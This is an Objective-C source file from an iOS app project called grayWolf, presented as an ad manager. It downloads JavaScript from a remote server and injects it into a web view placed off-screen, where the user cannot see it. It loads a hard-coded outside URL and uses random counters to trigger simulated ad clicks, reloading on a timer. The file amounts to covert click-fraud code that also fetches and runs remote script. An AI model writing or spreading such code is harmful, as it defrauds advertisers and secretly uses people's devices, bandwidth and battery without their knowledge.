//
//  AppAdManager.m
//  grayWolf
//
//  Created by zengbiwang on 2018/11/1.
//

#import "AppAdManager.h"
#import "AppAdWebView.h"
#import "MKNetworkEngine.h"
#import "helpFuntion.h"
#import "MajorSystemConfig.h"

#define intervalAdAppDayKey @"20181101intervalAdAppDay"
#define AdAppUrlIndexKey @"20181101AdAppUrlIndexKey"

@interface AppAdManager()<AppAdWebViewDelegate>
{
    BOOL isClickAd;//是否已经点击了广告
    MKNetworkEngine *adEngine;
    BOOL isCanClickAd;//是否需要点击广告
    NSInteger clickNewsTimes;//点击多少次后点击广告
    NSInteger clickVaildTimes;//操作网页次数
}
@property(nonatomic,copy)NSString *url;
@property(nonatomic,assign)BOOL isDebugMode;
@property(nonatomic,strong)NSString *configJs;
@property(nonatomic,strong)AppAdWebView *appWebView;
@property(nonatomic,assign)BOOL loadMode;
@property(nonatomic,copy)NSString *appKey;
@property(nonatomic,copy)NSString *loadUrl;

@end

@implementation AppAdManager

+(AppAdManager*)getInstance{
    static AppAdManager*g = nil;
    if (!g) {
        g = [[AppAdManager alloc] init];
    }
    return g;
}

-(void)startConfigUrl:(NSString*)url isDebugMode:(BOOL)isDebugMode{
    if([MajorSystemConfig getInstance].adAppUrlArray.count>0){
        isCanClickAd = (arc4random()%3 == 1);
        clickNewsTimes = arc4random()%3 + 1;
        clickVaildTimes  = 0;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        self.isDebugMode = isDebugMode;
//#ifdef DEBUG
//        self.configJs = [NSString stringWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"testFinger" ofType:@"js"] encoding:NSUTF8StringEncoding error:nil];
//        [self performSelector:@selector(startUpdateWebView) withObject:nil afterDelay:2];
//#else
        if (url) {
            self.url = url;
            [self reqeustAppAdService];
        }
//#endif
    });
    }
}

-(void)reqeustAppAdService{
    
    if (!adEngine) {
        adEngine = [[MKNetworkEngine alloc]init];
    }
    NSString *adJsUrl=self.url;
    MKNetworkOperation *op  = [adEngine operationWithURLString:adJsUrl timeOut:3];
    [op onCompletion:^(MKNetworkOperation *completedOperation) {
        NSInteger code = completedOperation.HTTPStatusCode;
        if (code>=200 && code<300)
        {
            self.configJs = completedOperation.responseString;
#ifdef DEBUG
            self.configJs =  [NSString stringWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"testFinger" ofType:@"js"] encoding:NSUTF8StringEncoding error:nil];
#endif
            [self performSelector:@selector(startUpdateWebView) withObject:nil afterDelay:2];
        }
        else{
            [self performSelector:@selector(reqeustAppAdService) withObject:nil afterDelay:1];
        }
    } onError:^(NSError *error, MKNetworkOperation *completedOperation) {
        [self performSelector:@selector(reqeustAppAdService) withObject:nil afterDelay:1];
    }];
    [adEngine enqueueOperation:op];
}

-(NSString*)getLoadAdUrl
{
    if (true) {
        NSUserDefaults *defaultUser =[NSUserDefaults standardUserDefaults];
        NSInteger vv = [[defaultUser objectForKey:AdAppUrlIndexKey] integerValue];
        NSInteger newVV = (vv+1)%[MajorSystemConfig getInstance].adAppUrlArray.count;
        [defaultUser setObject:[NSNumber numberWithInteger:newVV] forKey:AdAppUrlIndexKey];
        [defaultUser synchronize];
        NSDictionary *info = [[MajorSystemConfig getInstance].adAppUrlArray objectAtIndex:newVV];
        self.appKey  = [info objectForKey:@"appKey"];
        self.loadUrl = [info objectForKey:@"adurl"];
    }
    return self.loadUrl;
}

-(void)startUpdateWebView
{
    if (!self.appWebView) {
        CGRect rect = CGRectMake(0, 10000, [MajorSystemConfig getInstance].appSize.width, [MajorSystemConfig getInstance].appSize.height);
#ifdef DEBUG
        //rect = CGRectMake(0, 0, [MajorSystemConfig getInstance].appSize.width, [MajorSystemConfig getInstance].appSize.height);
#else
        
#endif
        self.appWebView = [[AppAdWebView alloc] initWithFrame:rect js:self.configJs];
        self.appWebView.delegate = self;
        [[[UIApplication sharedApplication].delegate window].rootViewController.view addSubview:self.appWebView];
    }
    
    NSString *requestUrl = [self getLoadAdUrl];
    requestUrl = @"http://www.bdhdhzf.com/index.html";
    self.loadMode = [[helpFuntion gethelpFuntion] isValideNotAutoAddCommonDay:self.appKey nCount:[MajorSystemConfig getInstance].everyAdAppDayTime intervalDay:[MajorSystemConfig getInstance].intervalAdAppDay isUseYYCache:NO time:nil];
    if (self.isDebugMode || isClickAd) {
        self.loadMode = false;
    }
    if(isCanClickAd && !isClickAd){
        if (clickVaildTimes==clickNewsTimes) {
            self.loadMode = true;
        }
        else{
            self.loadMode = false;
        }
    }
    else{
        self.loadMode = false;
    }
    clickVaildTimes++;
//    if(self.loadMode){
//        if([MajorSystemConfig getInstance].isGotoUserModel == 2 && [MajorSystemConfig getInstance].apiState == 0 && [MajorSystemConfig getInstance].isExcApla)
//        {
//
//        }
//        else{
//            self.loadMode = false;
//        }
//    }
    [self.appWebView loadUrl:requestUrl isNewMode:!self.loadMode];
}

-(void)willRemoveFromSuperView:(BOOL)isMode
{
    if (self.loadMode && !isClickAd) {
        isClickAd = true;
        [[helpFuntion gethelpFuntion] isValideCommonDay:self.appKey nCount:[MajorSystemConfig getInstance].everyAdAppDayTime intervalDay:[MajorSystemConfig getInstance].intervalAdAppDay isUseYYCache:NO time:nil];
    }
    [self.appWebView removeFromSuperview];
    self.appWebView = nil;
    [self performSelector:@selector(startUpdateWebView) withObject:nil afterDelay:arc4random()%10+2];
}

@end
